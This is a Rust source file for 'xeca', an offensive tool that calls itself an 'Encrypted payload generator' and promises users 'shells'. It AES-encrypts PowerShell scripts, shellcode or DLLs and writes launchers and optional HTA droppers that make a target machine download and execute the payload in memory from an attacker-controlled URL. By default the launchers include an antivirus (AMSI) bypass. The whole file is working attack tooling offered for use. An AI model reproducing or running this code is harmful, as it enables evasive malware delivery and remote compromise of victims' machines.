extern crate clap;

use clap::{App, AppSettings, Arg, ArgMatches};
use std::{env, fs, path, process};
use std::io::prelude::*;

#[allow(unused_imports)]
#[macro_use] extern crate hex_literal;
pub mod util;

fn banner() -> String {
    let banner = r#"                                                    
 _________        .------------------.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |  xeca:         | |             
|:______B:|      | |                | |             
|:______B:|      | |  File not      | |             
|         |      | |  found.        | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
               .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:

"#;
    format!("{}", banner)
}

fn check_url(url: &str) -> String {
    if String::from(url).chars().rev().nth(0).unwrap() == '/' {
        String::from(url)
    } else {
        format!("{}/", url)
    }
}

fn powershell_payload(matches: &ArgMatches) {
    let testurl = check_url(matches.value_of("url").unwrap());
    let url = testurl.as_str();
    let payload_path = matches.value_of("payload").unwrap();
    let payload = if path::Path::new(payload_path).exists() {
        fs::read_to_string(payload_path).unwrap()
    } else {
        println!("Could not find payload");
        process::exit(1);
    };
    let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
    let hta = if matches.is_present("generate_hta") { true } else { false };
    println!("Target URL: {}", url);
    println!("Payload: {}", payload_path);
    println!("Payload size: {}", payload.chars().count());
    println!("AMSI enabled: {}", !disable_amsi);
    println!("Generate HTA: {}", hta);

    // encrypt
    let (key, ciphertext) = util::aes::encrypt(&payload);
    let ciphertext_b64 = util::base64::base64encode(ciphertext);

    // write key to file
    let mut key_file = fs::File::create("safe.txt").expect("Error opening file to write key");
    key_file.write_all(&key).expect("Could not write contents to key file");
    println!("Encryption key saved to safe.txt");

    // prepare output file
    let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");

    // AMSI bypass
    if !disable_amsi {
        let amsi_bypass = util::payload::get_amsi();
        output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
    }
    let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
    output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
    println!("PowerShell launcher saved to launch.txt");

    // Write HTA if requested
    if hta {
        let hta_payload = util::payload::generate_hta(&url);
        let mut hta_file = fs::File::create("xeca.hta").expect("Error opening file to write HTA");
        hta_file.write_all(hta_payload.as_bytes()).expect("Could not write contents to hta file");
        println!("HTA saved to xeca.hta");
    }
}

fn shellcode_payload(matches: &ArgMatches) {
    let testurl = check_url(matches.value_of("url").unwrap());
    let url = testurl.as_str();
    let mut dll_to_shellcode = false;
    let target_path = if matches.is_present("shellcode")  {
        matches.value_of("shellcode").unwrap()
    } else {
        dll_to_shellcode = true;
        matches.value_of("dll").unwrap()
    };
    let shellcode = if path::Path::new(target_path).exists() {
        if dll_to_shellcode {
            let func_name = matches.value_of("func_name").unwrap();
            util::shellcode::shellcode_rdi(&target_path, func_name, String::from(""))
        } else {
            fs::read(target_path).unwrap()
        }
    } else {
        println!("Could not find shellcode");
        process::exit(1);
    };
    let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
    let hta = if matches.is_present("generate_hta") { true } else { false };
    println!("Target URL: {}", url);
    if dll_to_shellcode {
        println!("DLL: {}", target_path);
    } else {
        println!("Shellcode: {}", target_path);
    }
    println!("Shellcode size: {}", shellcode.len());
    println!("AMSI enabled: {}", !disable_amsi);
    println!("Generate HTA: {}", hta);

    // prepare invoker and shellcode
    let invoker = util::payload::get_invoke_shellcode();
    let shellcode_b64 = util::base64::base64encode(&shellcode);
    let payload = util::payload::shellcode_loader(&invoker, &shellcode_b64);
    let (key, ciphertext) = util::aes::encrypt(&payload);
    let ciphertext_b64 = util::base64::base64encode(ciphertext);

    // write key to file
    let mut key_file = fs::File::create("safe.txt").expect("Error opening file to write key");
    key_file.write_all(&key).expect("Could not write contents to key file");
    println!("Encryption key saved to safe.txt");

    // prepare output file
    let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");

    // AMSI bypass
    if !disable_amsi {
        let amsi_bypass = util::payload::get_amsi();
        output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
    }
    let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
    output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
    println!("PowerShell launcher saved to launch.txt");

    // Write HTA if requested
    if hta {
        let hta_payload = util::payload::generate_hta(&url);
        let mut hta_file = fs::File::create("xeca.hta").expect("Error opening file to write HTA");
        hta_file.write_all(hta_payload.as_bytes()).expect("Could not write contents to hta file");
        println!("HTA saved to xeca.hta");
    }
}

fn reflective_payload(matches: &ArgMatches) {
    let testurl = check_url(matches.value_of("url").unwrap());
    let url = testurl.as_str();
    let dll_path = matches.value_of("pe or dll").unwrap();
    let dll = if path::Path::new(dll_path).exists() {
        fs::read(dll_path).unwrap()
    } else {
        println!("Could not find payload");
        process::exit(1);
    };
    let disable_amsi = if matches.is_present("disable_amsi") { true } else { false };
    let hta = if matches.is_present("generate_hta") { true } else { false };
    println!("Target URL: {}", url);
    println!("PE/DLL: {}", dll_path);
    println!("PE/DLL size: {}", dll.len());
    println!("AMSI enabled: {}", !disable_amsi);
    println!("Generate HTA: {}", hta);

    // prepare invoker and shellcode
    let invoker = util::payload::get_invoke_reflective();
    let dll_b64 = util::base64::base64encode(&dll);
    let payload = util::payload::dll_loader(&invoker, &dll_b64);
    let (key, ciphertext) = util::aes::encrypt(&payload);
    let ciphertext_b64 = util::base64::base64encode(ciphertext);

    // write key to file
    let mut key_file = fs::File::create("safe.txt").expect("Error opening file to write key");
    key_file.write_all(&key).expect("Could not write contents to key file");
    println!("Encryption key saved to safe.txt");

    // prepare output file
    let mut output_file = fs::File::create("launch.txt").expect("Error opening file to write ciphertext");

    // AMSI bypass
    if !disable_amsi {
        let amsi_bypass = util::payload::get_amsi();
        output_file.write_all(amsi_bypass.as_bytes()).expect("Could not write contents to output file");
    }
    let aes_launcher = util::payload::powershell_aes_launcher(&ciphertext_b64, &url);
    output_file.write_all(aes_launcher.as_bytes()).expect("Could not write contents to output file");
    println!("PowerShell launcher saved to launch.txt");

    // Write HTA if requested
    if hta {
        let hta_payload = util::payload::generate_hta(&url);
        let mut hta_file = fs::File::create("xeca.hta").expect("Error opening file to write HTA");
        hta_file.write_all(hta_payload.as_bytes()).expect("Could not write contents to hta file");
        println!("HTA saved to xeca.hta");
    }
}

fn convert_dll(matches: &ArgMatches) {
    let dll_path = matches.value_of("dll").unwrap();
    let func_name = matches.value_of("func_name").unwrap();
    let shellcode = util::shellcode::shellcode_rdi(&dll_path, func_name, String::from(""));
    let output_name = if matches.is_present("output") {
        matches.value_of("").unwrap()
    } else {
        "."
    };
    let output_path = if fs::metadata(output_name).unwrap().is_dir() {
        format!("{}/shellcode.bin", output_name)
    } else {
        format!("shellcode.bin")
    };
    println!("DLL: {}", dll_path);
    println!("Shellcode size: {}", shellcode.len());

    // prepare output file
    let mut output_file = fs::File::create(&output_path).expect("Error opening file to write ciphertext");
    output_file.write_all(&shellcode).expect("Could not write shellcode to output file");
    println!("Shellcode saved to {}", output_path);
}

fn main() {
    // parse args
    let mut app = App::new("xeca")
        .version("0.1.0")
        .author("written by postrequest")
        .about("Encrypted payload generator")
        .subcommand(
            App::new("powershell")
                .about("Encrypt PowerShell payload to execute in memory")
                .version("0.1.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
                .arg(
                    Arg::with_name("payload")
                    .long("payload")
                    .takes_value(true)
                    .required(true)
                    .help("PowerShell payload")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .help("Generate HTA")
                )
        )
        .subcommand(
            App::new("shellcode")
                .about("PowerShell payload to execute reflective encrypted DLL shellcode in memory")
                .version("0.1.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .requires("url")
                    .help("Generate HTA")
                )
                .arg(
                    Arg::with_name("shellcode")
                    .long("shellcode")
                    .takes_value(true)
                    .required_unless("dll")
                    .help("Shellcode to execute in memory")
                )
                .arg(
                    Arg::with_name("dll")
                    .long("dll")
                    .takes_value(true)
                    .required_unless("shellcode")
                    .requires("func_name")
                    .help("DLL to convert to shellcode and execute in memory")
                )
                .arg(
                    Arg::with_name("func_name")
                    .long("func-name")
                    .takes_value(true)
                    .help("Function name to execute")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
        )
        .subcommand(
            App::new("reflective")
                .about("PowerShell payload to reflectively execute encrypted PE/DLL in memory")
                .version("0.1.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .requires("url")
                    .help("Generate HTA")
                )
                .arg(
                    Arg::with_name("pe or dll")
                    .long("target")
                    .takes_value(true)
                    .required(true)
                    .help("PE/DLL to execute in memory")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
        )
        .subcommand(
            App::new("convert")
                .about("Convert DLL to shellcode")
                .version("0.1.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("dll")
                    .long("dll")
                    .takes_value(true)
                    .required(true)
                    .requires("func_name")
                    .help("DLL to convert to shellcode")
                )
                .arg(
                    Arg::with_name("func_name")
                    .long("func-name")
                    .takes_value(true)
                    .required(true)
                    .requires("dll")
                    .help("Function name to execute")
                )
                .arg(
                    Arg::with_name("output")
                    .long("output")
                    .takes_value(true)
                    .help("Output directory")
                )
        );

    if env::args().count() < 2 {
        println!("{}", banner());
        app.print_help().expect("Error loading help");
        println!("\n\nPlease enter commands to get shells 🐢🐢🐢");
        process::exit(1);
    }
    let matches = app.get_matches();
    match matches.subcommand() {
        ("powershell", Some(powershell_matches)) => {
            powershell_payload(powershell_matches)
        }
        ("shellcode", Some(shellcode_matches)) => {
            shellcode_payload(shellcode_matches)
        }
        ("reflective", Some(reflective_matches)) => {
            reflective_payload(reflective_matches)
        }
        ("convert", Some(convert_matches)) => {
            convert_dll(convert_matches)
        }
        ("", None) => println!("Error handling subcommand"),
        _ => unreachable!(),
    }
    util::aes::funnies();
}
